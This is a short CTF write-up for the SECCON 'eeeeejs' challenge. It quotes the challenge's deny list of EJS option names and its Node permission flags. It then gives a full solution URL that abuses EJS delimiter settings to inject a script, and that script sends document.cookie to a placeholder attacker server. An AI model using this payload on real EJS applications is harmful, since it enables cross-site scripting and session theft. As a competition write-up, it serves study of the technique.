# eeeeejs

## Overview

It looked like a simple EJS abusing challenge, but it was mitigated and could not be exploited.

- Mitigation 2

```js
// Mitigation 2:
app.use((req, res, next) => {
  // A protection for RCE
  // FYI: https://github.com/mde/ejs/issues/735

  const evils = [
    "outputFunctionName",
    "escapeFunction",
    "localsName",
    "destructuredLocals",
    "escape",
  ];

  const data = JSON.stringify(req.query);
  if (evils.find((evil) => data.includes(evil))) {
    res.status(400).send("hacker?");
  } else {
    next();
  }
});
```

- Mitigation 4

```js
  const proc = await util
    .promisify(execFile)(
      "node",
      [
        // Mitigation 4:
        "--experimental-permission",
        `--allow-fs-read=${__dirname}/src`,

        "render.dist.js",
        JSON.stringify(req.query),
      ],
      {
        timeout: 2000,
        cwd: `${__dirname}/src`,
      }
    )
    .catch((e) => e);
```

In `package.json`, it build a `render.js` file and generates a `render.dist.js` file.

```
  "scripts": {
    "bundle": "esbuild src/render.js --bundle --platform=node --outfile=src/render.dist.js"
  },
```

The `render.dist.js` file has many gadgets and manipulates delimiters to create output.

- gadgets #1 (replace)

```js
    exports.escapeXML = function(markup) {
      return markup == void 0 ? "" : String(markup).replace(_MATCH_HTML, encode_char);
    };
```

- gadgets #2 (return)

```js
    function stripSemi(str) {
      return str.replace(/;(\s*$)/, "$1");
    }
```



## Solution

```
http://eeeeejs.seccon.games:3000/?filename=render.dist.js&delimiter=%0a&settings[view%20options][openDelimiter]=(markup)%20{&settings[view%20options][closeDelimiter]=%20&markup=%3Chr/%3E&_MATCH_HTML=hr /&encode_char=iframe%20srcdoc="%26lt;script src=%27%2F%3ffilename%3Drender.dist.js%26delimiter%3D%250a%26settings%5Bview%2520options%5D%5BopenDelimiter%5D%3DstripSemi%28str%29%2520%7B%26settings%5Bview%2520options%5D%5BcloseDelimiter%5D%3D%2520%26str%3Dtop.location.href=`http://{server}/flag?`.concat(document.cookie);%27%26gt;%26lt;/script%26gt;"
```


`SECCON{RCE_is_po55ible_if_mitigation_4_does_not_exist}`